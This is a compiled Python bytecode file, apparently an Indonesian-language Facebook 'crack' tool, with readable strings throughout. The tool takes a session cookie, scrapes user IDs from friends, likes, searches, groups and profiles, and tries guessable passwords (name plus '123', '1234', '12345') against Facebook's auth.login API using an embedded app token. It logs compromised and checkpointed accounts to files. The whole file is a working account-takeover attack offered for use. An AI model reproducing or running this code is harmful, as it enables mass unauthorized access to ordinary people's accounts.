a
    �/`&?  �                   @   s�   d dl Z d dlZd dlZd dlZd dlZd dlZd dlmZ d dl	m
Z
 d dlmZ dd� Zdd� Zd	d
� Zdd� Zdd� Zedkr�e�  e�  e�  e�  dS )�    N)�BeautifulSoup)�ThreadPoolExecutor)�sleepc                   C   s   t �d� d S )N�clear)�os�system� r   r   �/sdcard/q/ya.pyr      s    r   c                 C   s0   | d D ]"}t j�|� t j��  td� qd S )N�
gO贁Nk?)�sys�stdout�write�flushr   )�s�cr   r   r	   �kata   s    
r   c                   C   s|   t d� td� td� td� td� td� td� td� td	� td
� td� td� td� td� td� d S )N皙�����?uG   [0;93m	───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───uG   [0;93m	───█▒▒░░░░░░░░░▒▒█───uc   [0;93m	────█░░[0;91m█[0;93m░░░░░[0;91m█[0;93m░░█────uG   [0;93m	─▄▄──█░░░▀█▀░░░█──▄▄─uG   [0;93m	█░░█─▀▄░░░░░░░▄▀─█░░█uJ   [0;93m	█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█uX   [0;93m	█░░[0;91m╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗[0;93m░░█uX   [0;93m	█░░[0;91m║║║╠─║─║─║║║║║╠─[0;93m░░█uX   [0;93m	█░░[0;91m╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝[0;93m░░█uJ   [0;93m	█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█u0   [0;93m	█       [0;91mKIRANA      [0;93m █u0   [0;93m	█     [0;91mKURNIAW4TI   [0;93m  █u0   [0;93m	█    [0;91mHAMZAH KIRANA [0;93m  █uL   [0;93m	█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

)r   r   r   r   r   r	   �baner   s    r   c                  C   s*   t d�} | dkrt�d� n
t�d� d S )Nz!	[0;91mTekan Enter Untuk Kembali� zpython crack.pyz[0;91mKeluar)�inputZolsr   r   �exit)�fr   r   r	   �balik0   s    r   c               	      s  t d� td� td� td� t d� td�} | dk�r�d�g �dag �g }dadada��fd	d
�}d[�fdd�	}����fdd�����fdd�}����fdd��� ��fdd�� ����fdd��tdk�r�z�t�	� �|� }d|i�t
�  t�  td� td� td� td� td� td� t�  td �}|d!k�rPtd"� �n6|dk�r�t�j��d#��d$�jd%�jd&d'd(�}���|d) ��}�n�|d*k�r�td+�}|d!k�r�td,� n.d-|v �r�|�d-d.�}nd/|v �r�|�d/d0�}||�}�n�|d1k�r4td2�}	� ��d3|	 ��}t|�dk�r�td4� �nR|d5k�rztd6� td7�}
���d8|
 ��}t|�dk�r�td9� �n|d:k�rtd;�}	|	�� �r�d<|	 }nd=|	 }z<ttj��|��d$�jd%�jd&d'd(�d) }���|��}W n t�y    td>� Y n0 �n�|d?k�r~�zLtd@��� }tdA��� }|| }|�� �dB�}t|�}tdC� tdDdE��>}|D ](}|�dF�}|�||d |dG dH� �qbW d   � n1 �s�0    Y  t�dA� t�d@� t D ]@}td@d&��} | �!|dB � W d   � n1 �s�0    Y  �qĈD ]@}tdAd&��} | �!|dB � W d   � n1 �s>0    Y  �q
tdI� tdJ� W n t"�yz   tdK� Y n0 ntdL� t�  tdM�}tdNdE���}|D ]x}|�dF�}|d �dO�}|D ]T}t#|�dP t#|�dQ t#|�dR g}|�$|� t|�D ]}|�||dG |� �q��qĐq�W d   � n1 �s40    Y  tdk�sRtdk�r|t d� tdI� tdS� tdT� tdU� nt d� tdI� tdV� W n< t%t&f�y�   t�  Y n  tj'j(�y�   tdW� Y n0 n6| d*k�r�t�)dX� t*�  n| dYk�rt+�dZ� t�  d S )\Nr   z[0;91m1.) [0;93mMulai Crackz[0;91m2.) [0;93mUpdatez[0;91m0.) Keluaru   
[0;91mPilih •• [0;93m�1zhttps://mbasic.facebook.com{}r   c                     sH  zt d��� } W n ty*   td�} Y n0 d| i} �j� jddd�| d�j}dt|�v �r<d	t|�v r�t dd
��}|�| d � W d   � q�1 s�0    Y  nBt	d� z,t
j� �t|d�jddd�d �| d� W n   Y n0 zBtt
j� �d�| d�jd�jddd�d }�j� �|�| d� W n   Y n0 | d S td� d S )N�cookiesu   
[0;91mCOOKIES •• [0;93m�cookie�/meF)Zverify�r   Zmbasic_logout_buttonzApa yang Anda pikirkan sekarang�wz [0mMengubah Bahasa Harap Tunggu�html.parser�azBahasa Indonesia��string�hrefz/kosong02935wkdkZIkutiz[0;91mCookie Salah)�open�read�FileNotFoundErrorr   �get�format�content�strr   �print�requests�parser�findr   )�cekZismir   Zikuti)�mbasic�sesr   r	   �masuk^   s,    .,*zmbf.<locals>.masukFc           	   
      s�  d}|dd| d|dddd�	}d	}t j||d
�}d|jv r�td| � d|� d�dd� t�  td7 a|rxt�| d | � n@tdd��&}|�| d | d � W d   � n1 s�0    Y  n�d|�	� d v �rRtd| � d|� d�dd� t�  t
d7 a
|�r� �| d | � nBtdd��&}|�| d | d � W d   � n1 �sF0    Y  ntd7 atd�D ]:}tdtt�� dtt
�� dtt�� d�dd� td � �qbd S )!Nz/350685531728%7C62f8ce9f74b12f84c123cc23437a4a32ZJSON�2Zen_USZiosr   Z 3f555f99fb61fcd7aa0c44f58f522ef6)	Zaccess_tokenr(   Zsdk_versionZemailZlocale�passwordZsdkZgenerate_session_cookiesZsigz,https://b-api.facebook.com/method/auth.login)�paramsZEAAz[0;93m(OK) u    •• z                       r   ��end�   �|�multiresult.txtr    r
   zwww.facebook.comZ	error_msgz[0;91m(CP) z                    �checkpoint.txtu   \|/-•u   [0;93m(ok) •• (u   ) [0;91m(cp) •• (u   ) [0m•• (z)[0mg�������?)r,   r'   �textr+   �result�life�appendr$   r   �json�check�die�listr*   r   )	�usernamer4   r/   �br5   ZapiZresponser   �i)�chekr   r	   �login�   sB    �
68,zmbf.<locals>.loginc              
      s�   t j| �d�j}t�dt|��}|D ]�}d|d v r`��|d d t�dt|d ��d  � n:d|v rlq$n.��|d d |d �d	�d �d
�d  � tdtt	��� d dd� q$dt|�v r� ��
t|d�jddd�d �� �S )Nr   z,middle"><a class=".." href="(.*?)">(.*?)</a>�profiler   r8   r9   z=(\d*)?Zfriends�/�?�[0;91m�" [0;93mMengambil ID, Mohon Tunggur   r6   zLihat Teman Lainr   r    r!   r#   �r,   r'   r)   �re�findallr*   r?   �splitr+   �lenr(   r-   r.   )�url�rawZgetuser�x)�getid�id�kukir0   r   r	   rV   �   s    ,."zmbf.<locals>.getidc                    sR   z8t j| �d�j}t�dt|��d }� ��|��}|W S    td� Y n0 d S )Nr   zhref="(/ufi.*?)"r   z[0mGagal Mengambil ID)r,   r'   r)   rO   rP   r*   r(   r   )rS   �likeZloveZaws)�getlikerX   r0   r   r	   �	fromlikes�   s    zmbf.<locals>.fromlikesc              
      s�   t j| �d�j}t�dt|��}|D ]|}d|d v r`��|d d t�dt|d ��d  � n$��|d d |d �d�d  � td	tt	���� d
�dd� q$dt|�v rЈ ��
t|d�jddd�d �� �S )Nr   z)class="b."><a href="(.*?)">(.*?)</a></h3>rI   r   r8   r9   �=(\d*)rJ   rL   rM   r   r6   �Lihat Selengkapnyar   r    r!   r#   rN   )ZreactrY   Zids�user)rZ   rW   rX   r0   r   r	   rZ   
  s    ,$"zmbf.<locals>.getlikec              
      s�   t j| �d�j}t�dt|��}|D ]|}d|d v r`��|d d t�dt|d ��d  � n$��|d d |d �d�d  � td	tt	���� d
�dd� q$dt|�v rʈ t
|d�jddd�d � �S )Nr   z;class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>rI   r   r8   r9   r\   rK   rL   rM   r   r6   zLihat Hasil Selanjutnyar   r    r!   r#   )r,   r'   r)   rO   rP   r*   r?   rQ   r+   rR   r-   r.   )Zoption�search�usersr^   )�bysearchrW   rX   r   r	   ra   "  s    ,$zmbf.<locals>.bysearchc              
      s�   t j| �d�j}t�dt|��}|D ]r}d|d v r`��|d d t�dt|d ��d  � n��|d d |d  � tdtt���� d	�d
d� q$dt|�v rƈ ��	t
|d�jddd�d �� �S )Nr   z$a class=".." href="/(.*?)">(.*?)</a>rI   r   r8   r9   zid=(\d*)rL   rM   r   r6   r]   r   r    r!   r#   )r,   r'   r)   rO   rP   r*   r?   r+   rR   r(   r-   r.   )Zendpoint�grabr`   r^   )�grubidrW   rX   r0   r   r	   rc   :  s    ,"zmbf.<locals>.grubid�__main__r   z[0;91m1.) [0;93mCrack Temanz[0;91m2.) [0;93mCrack Likez&[0;91m3.) [0;93mCrack Pencarian Namaz$[0;91m4.) [0;93mCrack Member Grup z[0;91m5.) [0;93mCrack Publikz#[0;91m6.) [0;93mLihat Hasil Cracku   

[0;91mPilih •• [0;93mr   z[0;91mIsi Yang Benarr   r   r   r    ZTemanr!   r#   r3   u%   
[31;1mLing Postingan •• [1;33mz[31;1mzwww.facebookzmbasic.facebookzm.facebook.comzmbasic.facebook.com�3u   
[0;91mNama ••[0;93m z/search/people/?q=zGak ada�4z7
[0;91mHanya Bisa Mengambil [0;93m100 [0;91mID Saja u   
[0;91mID GRUP •• [0;93mz/browse/group/members/?id=z
[0mID Tidak ada�5u"   
[0;91mID/USERNAME •• [0;93mz/profile.php?id=rJ   z
[0mID/USERNAME gak ada�6r:   r;   r
   z
[0mMemeriksa Hasil�
   )Zmax_workersr9   r8   Tz
[0mSelesaizC
[0mFile Tersimpan Di
[0;93mmultiresult.txt
[0;91mcheckpoint.txtz[0mtidak mendapatkan hasilz[0;91msalahzS
[0;91mSandi Tambahan, ( [0;93mCONTOH ) [0;91msayang DLL

[0;91mSandi : [0;93m�   � Z123Z1234Z12345z[0;93mmultiresult.txtz[0;91mcheckpoint.txtz

z[0mTidak ada hasilz[0;91mTidak ada koneksizgit pull�0z
[0;91mKeluar)F),r   r+   r   rB   �countrA   r=   �__name__r,   ZSessionr   r   r   r   r-   r'   r(   r)   r.   �replacerR   �isdigit�	TypeErrorr$   r%   �striprQ   �setr   Zsubmitr   �remover>   r   r&   r*   r?   �KeyboardInterrupt�EOFError�
exceptions�ConnectionErrorr   r   r   )r   Zhackr2   rH   r[   ZkukisZtanyarS   rD   Zknfrb   r^   Zfile1Zfile2r    �finalZexrU   Zexpassr`   ZssZlistpassZpasswr   )	ra   rG   rV   rZ   rc   rW   rX   r0   r1   r	   �mbf<   s   
2N


&









*

<

22



�

>





rz   rd   )r   r   rO   r@   Zrandomr,   Zbs4r   r-   Zconcurrent.futuresr   �timer   r   r   r   r   rz   rn   r   r   r   r	   �<module>   s    0
   y